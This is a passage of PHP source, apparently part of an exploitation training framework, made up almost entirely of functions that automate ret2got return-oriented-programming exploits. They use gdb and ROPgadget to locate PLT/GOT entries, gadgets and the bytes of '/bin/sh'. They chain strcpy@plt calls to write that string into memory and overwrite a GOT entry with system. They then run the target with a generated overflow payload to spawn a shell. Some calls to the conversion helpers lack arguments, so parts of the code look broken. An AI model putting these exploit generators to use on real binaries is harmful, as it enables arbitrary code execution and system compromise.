	$this->requette("gdb -q -batch -ex 'info function' $this->file_path | grep '@plt' ");
	$addr_exit = $this->elf2addr4fonction_prog("exit");
	$this->pause();
	$fonctions = $this->req_ret_tab("gdb --batch -q -ex \"info functions\" $this->file_path | grep '@plt' | grep 'strcpy@plt' -A20 | cut -d' ' -f3 | cut -d'@' -f1");
	for($i = 1; $i < count($fonctions); $i++) {
		$fonctions[$i] = trim($fonctions[$i]);
		$this->chapitre("Test on $fonctions[$i] function");
		$payload = $this->payload_ret2got_system_exit_cmd_addr($offset,$who, $fonctions[$i], $system, $addr_exit, $bin_sh);
	
		$this->pause();
	}
	
	$this->remarque("printf came  before strcpy -> doesn't work");
	$this->requette("gdb -q -batch -ex 'info function' $this->file_path | grep '@plt' ");
	$this->pause();
	$this->payload_ret2got_system_exit_cmd_addr($offset,$who, "printf", $system, $addr_exit, $bin_sh);
	$this->requette("gdb -q -batch -ex 'info function' $this->file_path | grep '@plt' ");
	$this->pause();
}





function payload_ret2got_write_cmd2section($offset, $who, $section_start, $where, $system, $addr_exit) {
	
	$section_name = trim($this->req_ret_str("gdb -q --batch -ex 'b main' -ex 'r AAAA' -ex \"info files\" $this->file_path | grep 'is' | grep '$section_start' | tail -1 | cut -d'.' -f2 "));
	$this->rouge("in Section: $section_name");
	$this->article("Template", "\"A\"*(Offset EIP=$offset) (JUNK) +
		$who@plt + pop pop ret + &.$section_name"."[0]+0 + &'/' +
		$who@plt + pop pop ret + &.$section_name"."[0]+1 + &'b' +
		$who@plt + pop pop ret + &.$section_name"."[0]+2 + &'i' +
		$who@plt + pop pop ret + &.$section_name"."[0]+3 + &'n' +
		$who@plt + pop pop ret + &.$section_name"."[0]+4 + &'/' +
		$who@plt + pop pop ret + &.$section_name"."[0]+5 + &'s' +
		$who@plt + pop pop ret + &.$section_name"."[0]+6 + &'h' +
		$who@plt + pop pop ret + &.$section_name"."[0]+7 + &'0x00' +
		$who@plt + pop pop ret + GOT_of_$where"."[0]+0 + &system[8-9] +
		$who@plt + pop pop ret + GOT_of_$where"."[0]+1 + &system[6-7] +
		$who@plt + pop pop ret + GOT_of_$where"."[0]+2 + &system[4-5] +
		$who@plt + pop pop ret + GOT_of_$where"."[0]+3 + &system[2-3] +
		PLT_of_$where + &exit() + &.$section_name"."[0]
		");
		$this->pause();
	$strcpy_plt = $this->elf2addr4fonction_plt($who);
	$tab_pop = $this->elf2pop2ret4all("all");
	$pop = $tab_pop[0];
	
	
	$this->pause();
	$section_start_0 = $section_start;
	$section_start_1 = $this->addr2add($section_start_0,1);
	$section_start_2 = $this->addr2add($section_start_0,2);
	$section_start_3 = $this->addr2add($section_start_0,3);
	$section_start_4 = $this->addr2add($section_start_0,4);
	$section_start_5 = $this->addr2add($section_start_0,5);
	$section_start_6 = $this->addr2add($section_start_0,6);
	$section_start_7 = $this->addr2add($section_start_0,7);

	
	$this->requette("echo \"/bin/sh\" | hexdump -C ");
	$this->pause();
	$this->requette("ROPgadget --memstr \"/bin/sh\" --binary $this->file_path");
	$this->pause();
	$bin_sh_0 = trim($this->req_ret_str("ROPgadget --opcode '2f' --binary $this->file_path | grep '0x' | head -1 | cut -d':' -f1"));
	$bin_sh_1 = trim($this->req_ret_str("ROPgadget --opcode '62' --binary $this->file_path | grep '0x' | head -1 | cut -d':' -f1"));
	$bin_sh_2 = trim($this->req_ret_str("ROPgadget --opcode '69' --binary $this->file_path | grep '0x' | head -1 | cut -d':' -f1"));
	$bin_sh_3 = trim($this->req_ret_str("ROPgadget --opcode '6e' --binary $this->file_path | grep '0x' | head -1 | cut -d':' -f1"));
	$bin_sh_4 = trim($this->req_ret_str("ROPgadget --opcode '2f' --binary $this->file_path | grep '0x' | head -1 | cut -d':' -f1"));
	$bin_sh_5 = trim($this->req_ret_str("ROPgadget --opcode '73' --binary $this->file_path | grep '0x' | head -1 | cut -d':' -f1"));
	$bin_sh_6 = trim($this->req_ret_str("ROPgadget --opcode '68' --binary $this->file_path | grep '0x' | head -1 | cut -d':' -f1"));
	$bin_sh_7 = trim($this->req_ret_str("ROPgadget --opcode '00' --binary $this->file_path | grep '0x' | head -1 | cut -d':' -f1"));
	
	$where_got = $this->elf2addr4fonction_got($where);
	
	$where_got_0 = $where_got;
	$where_got_1 = $this->addr2add($where_got_0,1); 
	$where_got_2 = $this->addr2add($where_got_0,2); 
	$where_got_3 = $this->addr2add($where_got_0,3); 

	$this->pause();
	
	$system_0 = $this->elf2addr4opcode("$system[2]$system[3]");
	$system_1 = $this->elf2addr4opcode("$system[4]$system[5]");
	$system_2 = $this->elf2addr4opcode("$system[6]$system[7]");
	$system_3 = $this->elf2addr4opcode("$system[8]$system[9]");
	
	$where_plt = $this->elf2addr4fonction_plt($where);
	
	
	$strcpy_plt = $this->hex2norme_32(); 
	$pop = $this->hex2norme_32();
	$where_got_0 = $this->hex2norme_32();
	$where_got_1 = $this->hex2norme_32();
	$where_got_2 = $this->hex2norme_32();
	$where_got_3 = $this->hex2norme_32();
	$system_0 = $this->hex2norme_32();
	$system_1 = $this->hex2norme_32();
	$system_2 = $this->hex2norme_32();
	$system_3 = $this->hex2norme_32();
	$where_plt = $this->hex2norme_32();
	$addr_exit = $this->hex2norme_32();
	$section_start_0 = $this->hex2norme_32();
	$section_start_1 = $this->hex2norme_32();
	$section_start_2 = $this->hex2norme_32();
	$section_start_3 = $this->hex2norme_32();
	$section_start_4 = $this->hex2norme_32();
	$section_start_5 = $this->hex2norme_32();
	$section_start_6 = $this->hex2norme_32();
	$section_start_7 = $this->hex2norme_32();
	$bin_sh_0 = $this->hex2norme_32();
	$bin_sh_1 = $this->hex2norme_32();
	$bin_sh_2 = $this->hex2norme_32();
	$bin_sh_3 = $this->hex2norme_32();
	$bin_sh_4 = $this->hex2norme_32();
	$bin_sh_5 = $this->hex2norme_32();
	$bin_sh_6 = $this->hex2norme_32();
	$bin_sh_7 = $this->hex2norme_32();
	
	
	$this->article("Template", "\"A\"*(Offset EIP=$offset) (JUNK) +
		$who@plt + pop pop ret + &.$section_name"."[0]+0 + &'/' +
		$who@plt + pop pop ret + &.$section_name"."[0]+1 + &'b' +
		$who@plt + pop pop ret + &.$section_name"."[0]+2 + &'i' +
		$who@plt + pop pop ret + &.$section_name"."[0]+3 + &'n' +
		$who@plt + pop pop ret + &.$section_name"."[0]+4 + &'/' +
		$who@plt + pop pop ret + &.$section_name"."[0]+5 + &'s' +
		$who@plt + pop pop ret + &.$section_name"."[0]+6 + &'h' +
		$who@plt + pop pop ret + &.$section_name"."[0]+7 + &'0x00' +
		$who@plt + pop pop ret + GOT_of_$where"."[0]+0 + &system[8-9] +
		$who@plt + pop pop ret + GOT_of_$where"."[0]+1 + &system[6-7] +
		$who@plt + pop pop ret + GOT_of_$where"."[0]+2 + &system[4-5] +
		$who@plt + pop pop ret + GOT_of_$where"."[0]+3 + &system[2-3] +
		PLT_of_$where + &exit() + &.$section_name"."[0]
		");
	$this->article("$who@plt", $strcpy_plt);
	$this->article("POP POP RET", $pop);
	$this->article("&section[0]+0", $section_start_0);
	$this->article("&section[0]+1", $section_start_1);
	$this->article("&section[0]+2", $section_start_2);
	$this->article("&section[0]+3", $section_start_3);
	$this->article("&section[0]+4", $section_start_4);
	$this->article("&section[0]+5", $section_start_5);
	$this->article("&section[0]+6", $section_start_6);
	$this->article("&section[0]+7", $section_start_7);
	$this->article("&'/'", $bin_sh_0);
	$this->article("&'b'", $bin_sh_1);
	$this->article("&'i'", $bin_sh_2);
	$this->article("&'n'", $bin_sh_3);
	$this->article("&'/'", $bin_sh_4);
	$this->article("&'s'", $bin_sh_5);
	$this->article("&'h'", $bin_sh_6);
	$this->article("&'00'", $bin_sh_7);
	$this->article("$where@got[0]+0", $where_got_0);
	$this->article("$where@got[0]+1", $where_got_1);
	$this->article("$where@got[0]+2", $where_got_2);
	$this->article("$where@got[0]+3", $where_got_3);
	$this->article("@system[8-9]", $system_3);
	$this->article("@system[6-7]", $system_2);
	$this->article("@system[4-5]", $system_1);
	$this->article("@system[2-3]", $system_0);
	$this->article("$where@plt", $where_plt);
	$this->article("@exit", $addr_exit);
	
	
	$strcpy_plt = $this->hex2rev_32(); 
	$pop = $this->hex2rev_32();
	$where_got_0 = $this->hex2rev_32();
	$where_got_1 = $this->hex2rev_32();
	$where_got_2 = $this->hex2rev_32();
	$where_got_3 = $this->hex2rev_32();
	$system_0 = $this->hex2rev_32();
	$system_1 = $this->hex2rev_32();
	$system_2 = $this->hex2rev_32();
	$system_3 = $this->hex2rev_32();
	$where_plt = $this->hex2rev_32();
	$addr_exit = $this->hex2rev_32();
	$section_start_0 = $this->hex2rev_32();
	$section_start_1 = $this->hex2rev_32();
	$section_start_2 = $this->hex2rev_32();
	$section_start_3 = $this->hex2rev_32();
	$section_start_4 = $this->hex2rev_32();
	$section_start_5 = $this->hex2rev_32();
	$section_start_6 = $this->hex2rev_32();
	$section_start_7 = $this->hex2rev_32();
	$bin_sh_0 = $this->hex2rev_32();
	$bin_sh_1 = $this->hex2rev_32();
	$bin_sh_2 = $this->hex2rev_32();
	$bin_sh_3 = $this->hex2rev_32();
	$bin_sh_4 = $this->hex2rev_32();
	$bin_sh_5 = $this->hex2rev_32();
	$bin_sh_6 = $this->hex2rev_32();
	$bin_sh_7 = $this->hex2rev_32();
	
	

	$cmd = "python -c 'print \"\x41\"*$offset+\"$strcpy_plt\"+\"$pop\"+\"$section_start_0\"+\"$bin_sh_0\"+\"$strcpy_plt\"+\"$pop\"+\"$section_start_1\"+\"$bin_sh_1\"+\"$strcpy_plt\"+\"$pop\"+\"$section_start_2\"+\"$bin_sh_2\"+\"$strcpy_plt\"+\"$pop\"+\"$section_start_3\"+\"$bin_sh_3\"+\"$strcpy_plt\"+\"$pop\"+\"$section_start_4\"+\"$bin_sh_4\"+\"$strcpy_plt\"+\"$pop\"+\"$section_start_5\"+\"$bin_sh_5\"+\"$strcpy_plt\"+\"$pop\"+\"$section_start_6\"+\"$bin_sh_6\"+\"$strcpy_plt\"+\"$pop\"+\"$section_start_7\"+\"$bin_sh_7\"+\"$strcpy_plt\"+\"$pop\"+\"$where_got_0\"+\"$system_3\"+\"$strcpy_plt\"+\"$pop\"+\"$where_got_1\"+\"$system_2\"+\"$strcpy_plt\"+\"$pop\"+\"$where_got_2\"+\"$system_1\"+\"$strcpy_plt\"+\"$pop\"+\"$where_got_3\"+\"$system_0\"+\"$where_plt\"+\"$addr_exit\"+\"$section_start_0\"'";
	$query = "$this->file_path  \$($cmd)";
	$this->payload2check4norme($cmd,$this->badchars);
	$this->requette($query);
	return $cmd;
}





function payload_ret2got_write_cmd2section_small($offset, $who, $section_start, $where, $system, $addr_exit) {

	$section_name = trim($this->req_ret_str("gdb -q --batch -ex 'b main' -ex 'r AAAA' -ex \"info files\" $this->file_path | grep 'is' | grep '$section_start' | tail -1 | cut -d'.' -f2 "));
	$this->rouge("in Section: $section_name");
	$this->article("Template", "\"A\"*(Offset EIP=$offset) (JUNK) +
		$who@plt + pop pop ret + &.$section_name"."[0]+0 + &'s' +
		$who@plt + pop pop ret + &.$section_name"."[0]+1 + &'h' +
		$who@plt + pop pop ret + &.$section_name"."[0]+2 + &'00' +
		$who@plt + pop pop ret + GOT_of_$where"."[0]+0 + &system[8-9] +
		$who@plt + pop pop ret + GOT_of_$where"."[0]+1 + &system[6-7] +
		$who@plt + pop pop ret + GOT_of_$where"."[0]+2 + &system[4-5] +
		$who@plt + pop pop ret + GOT_of_$where"."[0]+3 + &system[2-3] +
		PLT_of_$where + &exit() + &.$section_name"."[0]
		");
		
		$strcpy_plt = $this->elf2addr4fonction_plt($who);
		$tab_pop = $this->elf2pop2ret4all("all");
		$pop = $tab_pop[0];
		
		$section_start_0 = $section_start;
		$section_start_1 = $this->addr2add($section_start_0,1);
		$section_start_2 = $this->addr2add($section_start_0,2);

		$this->requette("echo \"sh\" | hexdump -C ");
		$this->requette("ROPgadget --memstr \"sh\" --binary $this->file_path");
		
		$bin_sh_0 = trim($this->req_ret_str("ROPgadget --opcode '73' --binary $this->file_path | grep 0x | head -1 | cut -d':' -f1"));
		$bin_sh_1 = trim($this->req_ret_str("ROPgadget --opcode '68' --binary $this->file_path | grep 0x | head -1 | cut -d':' -f1"));
		$bin_sh_2 = trim($this->req_ret_str("ROPgadget --opcode '00' --binary $this->file_path | grep 0x | head -1 | cut -d':' -f1"));
		
		$where_got = $this->elf2addr4fonction_got($where);

		$where_got_0 = $where_got;
		$where_got_1 = $this->addr2add($where_got_0,1);
		$where_got_2 = $this->addr2add($where_got_0,2);
		$where_got_3 = $this->addr2add($where_got_0,3);

		$system_0 = $this->elf2addr4opcode("$system[2]$system[3]");
		$system_1 = $this->elf2addr4opcode("$system[4]$system[5]");
		$system_2 = $this->elf2addr4opcode("$system[6]$system[7]");
		$system_3 = $this->elf2addr4opcode("$system[8]$system[9]");

		$where_plt = $this->elf2addr4fonction_plt($where);


		$strcpy_plt = $this->hex2norme_32($strcpy_plt); 
		$pop = $this->hex2norme_32($pop);
		$where_got_0 = $this->hex2norme_32($where_got_0);
		$where_got_1 = $this->hex2norme_32($where_got_1);
		$where_got_2 = $this->hex2norme_32($where_got_2);
		$where_got_3 = $this->hex2norme_32($where_got_3);
		$system_0 = $this->hex2norme_32($system_0);
		$system_1 = $this->hex2norme_32($system_1);
		$system_2 = $this->hex2norme_32($system_2);
		$system_3 = $this->hex2norme_32($system_3);
		$where_plt = $this->hex2norme_32($where_plt);
		$addr_exit = $this->hex2norme_32($addr_exit);
		$section_start_0 = $this->hex2norme_32($section_start_0);
		$section_start_1 = $this->hex2norme_32($section_start_1);
		$section_start_2 = $this->hex2norme_32($section_start_2);
		$bin_sh_0 = $this->hex2norme_32($bin_sh_0);
		$bin_sh_1 = $this->hex2norme_32($bin_sh_1);
		$bin_sh_2 = $this->hex2norme_32($bin_sh_2);
		
		
		$this->article("Template", "\"A\"*(Offset EIP=$offset) (JUNK) +
		$who@plt + pop pop ret + &.$section_name"."[0]+0 + &'s' +
		$who@plt + pop pop ret + &.$section_name"."[0]+1 + &'h' +
		$who@plt + pop pop ret + &.$section_name"."[0]+2 + &'00' +
		$who@plt + pop pop ret + GOT_of_$where"."[0]+0 + &system[8-9] +
		$who@plt + pop pop ret + GOT_of_$where"."[0]+1 + &system[6-7] +
		$who@plt + pop pop ret + GOT_of_$where"."[0]+2 + &system[4-5] +
		$who@plt + pop pop ret + GOT_of_$where"."[0]+3 + &system[2-3] +
		PLT_of_$where + &exit() + &.$section_name"."[0]
		");
		$this->article("$who@plt", $strcpy_plt);
		$this->article("POP POP RET", $pop);
		$this->article("&section[0]+0", $section_start_0);
		$this->article("&section[0]+1", $section_start_1);
		$this->article("&section[0]+2", $section_start_2);
		$this->article("&'s'", $bin_sh_0);
		$this->article("&'h'", $bin_sh_1);
		$this->article("&'00'", $bin_sh_2);

		$this->article("$where@got[0]+0", $where_got_0);
		$this->article("$where@got[0]+1", $where_got_1);
		$this->article("$where@got[0]+2", $where_got_2);
		$this->article("$where@got[0]+3", $where_got_3);
		$this->article("@system[8-9]", $system_3);
		$this->article("@system[6-7]", $system_2);
		$this->article("@system[4-5]", $system_1);
		$this->article("@system[2-3]", $system_0);
		$this->article("$where@plt", $where_plt);
		$this->article("@exit", $addr_exit);

		
		$strcpy_plt = $this->hex2rev_32($strcpy_plt); 
		$pop = $this->hex2rev_32($pop);
		$where_got_0 = $this->hex2rev_32($where_got_0);
		$where_got_1 = $this->hex2rev_32($where_got_1);
		$where_got_2 = $this->hex2rev_32($where_got_2);
		$where_got_3 = $this->hex2rev_32($where_got_3);
		$system_0 = $this->hex2rev_32($system_0);
		$system_1 = $this->hex2rev_32($system_1);
		$system_2 = $this->hex2rev_32($system_2);
		$system_3 = $this->hex2rev_32($system_3);
		$where_plt = $this->hex2rev_32($where_plt);
		$addr_exit = $this->hex2rev_32($addr_exit);
		$section_start_0 = $this->hex2rev_32($section_start_0);
		$section_start_1 = $this->hex2rev_32($section_start_1);
		$section_start_2 = $this->hex2rev_32($section_start_2);
		$bin_sh_0 = $this->hex2rev_32($bin_sh_0);
		$bin_sh_1 = $this->hex2rev_32($bin_sh_1);
		$bin_sh_2 = $this->hex2rev_32($bin_sh_2);
		
		
		$cmd = "python -c 'print \"\x41\"*$offset+\"$strcpy_plt\"+\"$pop\"+\"$section_start_0\"+\"$bin_sh_0\"+\"$strcpy_plt\"+\"$pop\"+\"$section_start_1\"+\"$bin_sh_1\"+\"$strcpy_plt\"+\"$pop\"+\"$section_start_2\"+\"$bin_sh_2\"+\"$strcpy_plt\"+\"$pop\"+\"$where_got_0\"+\"$system_3\"+\"$strcpy_plt\"+\"$pop\"+\"$where_got_1\"+\"$system_2\"+\"$strcpy_plt\"+\"$pop\"+\"$where_got_2\"+\"$system_1\"+\"$strcpy_plt\"+\"$pop\"+\"$where_got_3\"+\"$system_0\"+\"$where_plt\"+\"$addr_exit\"+\"$section_start_0\"'";
		$query = "$this->file_path  \$($cmd)";
		$this->payload2check4norme($cmd,$this->badchars);
		$this->requette($query);
		return $cmd;
}

}
?>
